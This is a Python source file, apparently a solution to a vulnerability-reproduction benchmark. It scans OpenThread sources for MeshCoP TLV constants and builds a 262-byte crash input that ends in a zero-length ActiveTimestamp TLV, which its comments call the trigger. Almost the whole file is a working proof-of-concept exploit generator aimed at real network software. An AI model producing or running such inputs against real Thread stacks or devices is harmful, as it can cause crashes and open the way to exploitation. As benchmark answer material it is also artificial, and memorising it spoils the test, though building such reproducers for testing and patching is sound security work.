import os
import re
import tarfile
import tempfile
import shutil
from typing import Optional, Dict, Iterable, Tuple


class Solution:
    def _safe_extract_tar(self, tar_path: str, dst_dir: str) -> None:
        def is_within_directory(directory: str, target: str) -> bool:
            abs_directory = os.path.abspath(directory)
            abs_target = os.path.abspath(target)
            return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

        with tarfile.open(tar_path, "r:*") as tar:
            for member in tar.getmembers():
                member_path = os.path.join(dst_dir, member.name)
                if not is_within_directory(dst_dir, member_path):
                    continue
                try:
                    tar.extract(member, dst_dir)
                except Exception:
                    pass

    def _iter_source_files(self, root: str) -> Iterable[str]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".ipp", ".inl"}
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in (".git", ".svn", ".hg", "build", "out", "dist", "node_modules")]
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                yield path

    def _read_text(self, path: str) -> str:
        try:
            with open(path, "rb") as f:
                data = f.read()
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def _find_preferred_files(self, root: str) -> Tuple[Optional[str], Optional[str]]:
        tlv_file = None
        dataset_file = None
        for path in self._iter_source_files(root):
            base = os.path.basename(path).lower()
            if tlv_file is None and ("meshcop" in base and "tlv" in base):
                tlv_file = path
            if dataset_file is None and ("dataset" in base and (base.endswith(".hpp") or base.endswith(".h") or base.endswith(".cpp") or base.endswith(".cc"))):
                dataset_file = path
            if tlv_file and dataset_file:
                break
        return tlv_file, dataset_file

    def _parse_enum_value(self, text: str, name: str) -> Optional[int]:
        m = re.search(r"\b" + re.escape(name) + r"\b\s*=\s*(0x[0-9a-fA-F]+|\d+)\b", text)
        if not m:
            return None
        s = m.group(1)
        try:
            return int(s, 16) if s.lower().startswith("0x") else int(s, 10)
        except Exception:
            return None

    def _extract_constants(self, root: str) -> Dict[str, int]:
        wanted = {
            "kChannel": None,
            "kPanId": None,
            "kActiveTimestamp": None,
            "kPendingTimestamp": None,
            "kDelayTimer": None,
        }
        candidates = []

        tlv_file, dataset_file = self._find_preferred_files(root)
        if tlv_file:
            candidates.append(tlv_file)
        if dataset_file and dataset_file not in candidates:
            candidates.append(dataset_file)

        scanned = set(candidates)
        for path in list(candidates):
            text = self._read_text(path)
            for k in list(wanted.keys()):
                if wanted[k] is None and k in text:
                    val = self._parse_enum_value(text, k)
                    if val is not None:
                        wanted[k] = val

        if any(v is None for v in wanted.values()):
            keys_need = {k for k, v in wanted.items() if v is None}
            key_hits = 0
            for path in self._iter_source_files(root):
                if path in scanned:
                    continue
                base = os.path.basename(path).lower()
                if not (("meshcop" in base) or ("tlv" in base) or ("dataset" in base) or ("mle" in base) or ("commission" in base)):
                    continue
                text = self._read_text(path)
                changed = False
                for k in list(keys_need):
                    if k in text:
                        val = self._parse_enum_value(text, k)
                        if val is not None:
                            wanted[k] = val
                            keys_need.remove(k)
                            changed = True
                if changed:
                    key_hits += 1
                if not keys_need or key_hits >= 8:
                    break

        out = {}
        for k, v in wanted.items():
            if v is not None:
                out[k] = v
        return out

    def solve(self, src_path: str) -> bytes:
        root = None
        tmpdir = None
        try:
            if os.path.isdir(src_path):
                root = src_path
            else:
                tmpdir = tempfile.mkdtemp(prefix="src_")
                self._safe_extract_tar(src_path, tmpdir)
                root = tmpdir

            consts = self._extract_constants(root) if root else {}

            # Reasonable defaults for OpenThread MeshCoP TLVs
            t_channel = consts.get("kChannel", 0)
            t_panid = consts.get("kPanId", 1)
            t_active_ts = consts.get("kActiveTimestamp", 14)

            target_len = 262
            filler_len = target_len - 2  # leave last 2 bytes for ActiveTimestamp TLV header with zero length

            # TLV sizes: Channel TLV total = 2 + 3 = 5; PanId TLV total = 2 + 2 = 4
            a = b = None
            for bb in range(0, 5):
                rem = filler_len - 4 * bb
                if rem >= 0 and rem % 5 == 0:
                    a = rem // 5
                    b = bb
                    break
            if a is None:
                b = 0
                a = filler_len // 5
                # If remainder exists, adjust by reducing channels and adding panids
                rem = filler_len - 5 * a
                while rem != 0 and a > 0:
                    a -= 1
                    rem = filler_len - 5 * a
                    if rem % 4 == 0:
                        b = rem // 4
                        rem = 0
                        break
                if rem != 0:
                    # Fallback to minimal valid stream with just the triggering TLV (may still crash on some harnesses)
                    return bytes([t_active_ts & 0xFF, 0x00])

            channel_tlv = bytes([t_channel & 0xFF, 0x03, 0x00, 0x00, 0x0B])  # page=0, channel=11
            panid_tlv = bytes([t_panid & 0xFF, 0x02, 0x12, 0x34])  # panid=0x1234
            payload = channel_tlv * a + panid_tlv * b + bytes([t_active_ts & 0xFF, 0x00])

            if len(payload) != target_len:
                # Last-resort hardening: trim/pad while keeping final trigger TLV at end
                if len(payload) > target_len:
                    payload = payload[: target_len - 2] + bytes([t_active_ts & 0xFF, 0x00])
                else:
                    payload = payload[:-2] + (b"\x00" * (target_len - len(payload))) + bytes([t_active_ts & 0xFF, 0x00])

            return payload
        finally:
            if tmpdir and os.path.isdir(tmpdir):
                shutil.rmtree(tmpdir, ignore_errors=True)